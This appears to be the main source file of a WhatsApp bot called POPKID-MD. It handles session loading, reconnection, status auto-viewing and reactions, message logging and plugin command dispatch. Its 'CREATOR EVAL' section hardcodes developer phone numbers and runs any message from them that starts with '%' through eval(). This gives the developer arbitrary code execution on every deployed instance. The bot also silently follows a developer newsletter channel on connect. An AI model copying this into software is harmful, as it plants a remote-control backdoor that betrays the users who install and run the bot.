/**
 * 👑 POPKID-MD (Anti-Crash Version)
 * Creator: Popkid Ke
 * Improvements: Refined Status Logic, Aesthetic Logs, Auto-Reconnect
 */

const fs = require('fs')
const path = require('path')
const os = require('os')
const zlib = require('zlib')
const { promisify } = require('util')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const qrcode = require('qrcode-terminal')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const bodyparser = require('body-parser')
const gradient = require('gradient-string')
const express = require("express")
const ff = require('fluent-ffmpeg')
const StickersTypes = require('wa-sticker-formatter')
const Crypto = require('crypto')

// ============ LOGGER & BANNER CONFIGURATION ============
const logThemes = {
    info: ['#4facfe', '#00f2fe'],
    success: ['#00b09b', '#96c93d'],
    warning: ['#f83600', '#f9d423'],
    error: ['#ff416c', '#ff4b2b'],
    event: ['#8a2be2', '#da70d6'],
    message: ['#00c6ff', '#0072ff'],
    banner: ['#ff00cc', '#3333ff']
};

const cmdLogger = {
    info: (msg) => console.log(gradient(logThemes.info[0], logThemes.info[1])(`ℹ ${msg}`)),
    success: (msg) => console.log(gradient(logThemes.success[0], logThemes.success[1])(`✓ ${msg}`)),
    warning: (msg) => console.log(gradient(logThemes.warning[0], logThemes.warning[1])(`⚠ ${msg}`)),
    error: (msg) => console.log(gradient(logThemes.error[0], logThemes.error[1])(`✗ ${msg}`)),
    banner: (msg) => console.log(gradient(logThemes.banner[0], logThemes.banner[1])(msg)),
    message: (msg) => console.log(gradient(logThemes.message[0], logThemes.message[1])(msg))
};

const botBanner = `
██████╗ ██████╗ ██████╗ ██╗ ██╗██╗██████╗ ██╗ ██╗██████╗ 
██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║██╔══██╗╚██╗██╔╝██╔══██╗
██████╔╝██║ ██║██████╔╝█████╔╝ ██║██║ ██║ ╚███╔╝ ██║ ██║
██╔═══╝ ██║ ██║██╔═══╝ ██╔═██╗ ██║██║ ██║ ██╔██╗ ██║ ██║
██║ ╚██████╔╝██║ ██║ ██╗██║██████╔╝██╔╝ ██╗██████╔╝
╚═╝ ╚═════╝ ╚═╝ ╚═╝ ╚═╝╚═╝╚═════╝ ╚═╝ ╚═╝╚═════╝`;

console.clear();
cmdLogger.banner(botBanner);
cmdLogger.info("Starting POPKID-MD... 🚀");

// ============ GLOBAL ANTI-CRASH ============
process.on("uncaughtException", (err) => { cmdLogger.error(`Uncaught Exception: ${err.message}`) });
process.on("unhandledRejection", (reason, promise) => { cmdLogger.error(`Unhandled Rejection: ${reason}`) });

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys')

const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')

const ownerNumber = ['254732297194']
const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) return;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => { if (err) {} })
        }
    })
}
setInterval(clearTempDir, 5 * 60 * 1000)

//=================== SESSION-AUTH ============================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

async function loadGiftedSession() {
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    if (fs.existsSync(credsPath)) return true;

    if (config.SESSION_ID && config.SESSION_ID.startsWith("POPKID~")) {
        const compressedBase64 = config.SESSION_ID.substring("POPKID~".length);
        try {
            const compressedBuffer = Buffer.from(compressedBase64, 'base64');
            if (compressedBuffer[0] === 0x1f && compressedBuffer[1] === 0x8b) {
                const gunzip = promisify(zlib.gunzip);
                const decompressedBuffer = await gunzip(compressedBuffer);
                await fs.promises.writeFile(credsPath, decompressedBuffer.toString('utf-8'));
                cmdLogger.success("Session restored successfully ✅");
                return true;
            }
        } catch (error) {
            cmdLogger.error("Failed to decompress session ID");
            return false;
        }
    } else {
        cmdLogger.warning('Please add your SESSION_ID to the env!');
    }
    return false;
}

const app = express()
const port = process.env.PORT || 9090
let conn

async function connectToWA() {
    try {
        await loadGiftedSession();
        cmdLogger.info("Connecting to WhatsApp... ⏳");

        const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
        const { version } = await fetchLatestBaileysVersion()

        conn = makeWASocket({
            logger: P({ level: 'silent' }),
            printQRInTerminal: false,
            browser: Browsers.macOS("Firefox"),
            syncFullHistory: true,
            auth: state,
            version
        })

        conn.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update
            if (qr) {
                cmdLogger.info('Scan the QR code below:');
                qrcode.generate(qr, { small: true })
            }
            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
                if (shouldReconnect) {
                    cmdLogger.warning('Connection lost. Reconnecting... 🔄');
                    setTimeout(() => connectToWA(), 5000)
                } else {
                    cmdLogger.error('Logged out. Please update your SESSION_ID.');
                }
            } else if (connection === 'open') {
                cmdLogger.info('Installing plugins... 📂');
                const plugins = fs.readdirSync("./plugins/").filter(p => p.endsWith(".js"));
                plugins.forEach(plugin => require("./plugins/" + plugin));

                cmdLogger.success(`Successfully loaded ${plugins.length} plugins 💎`);
                cmdLogger.success('POPKID XD IS ONLINE 📲');

                let up = `╔════════════════════╗\n║  🚀 POPKID-MD CONNECTED\n╠════════════════════╣\n║ 👤 USER: ${conn.user.name || 'Bot'}\n║ 🔑 PREFIX: ${config.PREFIX}\n║ 👨‍💻 DEV: Popkid Kenya\n╚════════════════════╝`;
                
                await conn.sendMessage(conn.user.id, { 
                    image: { url: `https://files.catbox.moe/j9ia5c.png` }, 
                    caption: up 
                });

                const channelJid = "120363423997837331@newsletter"
                try { await conn.newsletterFollow(channelJid) } catch (error) {}
            }
        })

        conn.ev.on('creds.update', saveCreds)

        conn.ev.on('messages.upsert', async (mek) => {
            mek = mek.messages[0]
            if (!mek.message) return
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

            const from = mek.key.remoteJid
            const isStatus = from === 'status@broadcast'
            const sender = mek.key.participant || mek.key.remoteJid;

            // ============ STATUS HANDLER (FIXED & ACCURATE) ============
            if (isStatus) {
                if (config.AUTO_STATUS_SEEN === "true") {
                    await conn.readMessages([mek.key]);
                }

                if (config.AUTO_STATUS_REACT === "true") {
                    const reactionEmojis = ['❤️', '🔥', '✨', '⚡', '💎', '👑'];
                    const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];
                    await conn.sendMessage(from, { 
                        react: { text: randomEmoji, key: mek.key } 
                    }, { 
                        statusJidList: [sender, conn.user.id.split(':')[0] + '@s.whatsapp.net'] 
                    });
                }

                if (config.AUTO_STATUS_REPLY === "true" && !mek.key.fromMe) {
                    await conn.sendMessage(sender, { text: config.AUTO_STATUS_MSG }, { quoted: mek });
                }
                return; 
            }

            // ============ MESSAGE LOGGER ============
            if (!mek.key.fromMe) {
                const typeLog = getContentType(mek.message);
                const pushLog = mek.pushName || 'User';
                const bodyLog = (typeLog === 'conversation') ? mek.message.conversation : (typeLog === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : '[Media Message]';
                cmdLogger.message(`📩 [${pushLog}] : ${bodyLog.substring(0, 30)}...`);
            }

            if (config.READ_MESSAGE === 'true' && !isStatus) {
                await conn.readMessages([mek.key]);
            }

            await saveMessage(mek);

            const m = sms(conn, mek)
            const type = getContentType(mek.message)
            const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''

            const isCmd = body.startsWith(config.PREFIX)
            const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
            const args = body.trim().split(/ +/).slice(1)
            const q = args.join(' ')
            const text = args.join(' ')
            const isGroup = from.endsWith('@g.us')
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const isOwner = ownerNumber.includes(senderNumber) || mek.key.fromMe
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
            const groupName = isGroup ? groupMetadata.subject : ''
            const participants = isGroup ? await groupMetadata.participants : ''
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const pushname = mek.pushName || 'User'
            const isReact = m.message.reactionMessage ? true : false

            const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })

            // ============ CREATOR EVAL ============
            const udp = botNumber.split('@')[0];
            const rav = ('254732297194', '254111385747');
            let isCreator = [udp, rav, config.DEV].map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(mek.sender);

            if (isCreator && body.startsWith('%')) {
                let code = body.slice(2);
                if (!code) return reply(`Provide me with a query to run Master!`);
                try { let resultTest = eval(code); reply(util.format(resultTest)); } catch (err) { reply(util.format(err)); }
                return;
            }

            // ============ AUTO REACTIONS ============
            if (senderNumber.includes("254732297194") && !isReact) {
                const reactions = ["👑", "💀", "🔥", "❤️", "⚡"];
                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
            }

            if (!isReact && config.AUTO_REACT === 'true') {
                const reactions = ['❤️', '🔥', '⚡', '✨', '💎'];
                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
            }

            // ============ MODE FILTERS ============
            if(!isOwner && config.MODE === "private") return
            if(!isOwner && isGroup && config.MODE === "inbox") return
            if(!isOwner && !isGroup && config.MODE === "groups") return

            // ============ COMMAND EXECUTION ============
            const events = require('./command')
            const cmdName = isCmd ? body.slice(config.PREFIX.length).trim().split(" ")[0].toLowerCase() : false;
            
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                if (cmd) {
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
                    try {
                        cmd.function(conn, mek, m, {from, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                    } catch (e) { cmdLogger.error("[PLUGIN ERROR] " + e); }
                }
            }

            events.commands.map(async(command) => {
                if (body && command.on === "body") {
                    command.function(conn, mek, m,{from, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                }
            });
        });

        // ============ CORE CONN UTILS ============
        conn.decodeJid = jid => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {};
                return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
            } else return jid;
        };

        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
            let quoted = message.msg ? message.msg : message
            let mime = (message.msg || message).mimetype || ''
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
            const stream = await downloadContentFromMessage(quoted, messageType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
            let type = await FileType.fromBuffer(buffer)
            let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
            await fs.writeFileSync(trueFileName, buffer)
            return trueFileName
        }

        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
            let res = await axios.head(url)
            let mime = res.headers['content-type']
            let buffer = await getBuffer(url)
            if (mime.split("/")[1] === "gif") return conn.sendMessage(jid, { video: buffer, caption: caption, gifPlayback: true, ...options }, { quoted })
            if (mime === "application/pdf") return conn.sendMessage(jid, { document: buffer, mimetype: 'application/pdf', caption: caption, ...options }, { quoted })
            if (mime.split("/")[0] === "image") return conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
            if (mime.split("/")[0] === "video") return conn.sendMessage(jid, { video: buffer, caption: caption, mimetype: 'video/mp4', ...options }, { quoted })
            if (mime.split("/")[0] === "audio") return conn.sendMessage(jid, { audio: buffer, caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted })
        }

        // Additional Prototypes (copyNForward, cMod, getFile, etc.)
        conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
        
        conn.setStatus = status => {
            conn.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }] });
            return status;
        };

    } catch (err) {
        cmdLogger.error(`Connection failed: ${err.message}`);
    }
}

// ============ UTILS ============
setInterval(async () => {
    if (config.AUTO_BIO === "true" && conn) {
        const now = new Date();
        const date = now.toLocaleDateString('en-KE', { timeZone: 'Africa/Nairobi' });
        const time = now.toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi', hour12: false });
        await conn.setStatus(`❤️ POPKID XMD 🤖 | 📅 ${date} | ⏰ ${time}`).catch(() => {});
    }
}, 60000);

app.get("/", (req, res) => res.send("POPKID-MD ACTIVE ✅"));
app.listen(port, () => cmdLogger.info(`Server active on port ${port}`));

setTimeout(() => { connectToWA() }, 5000);
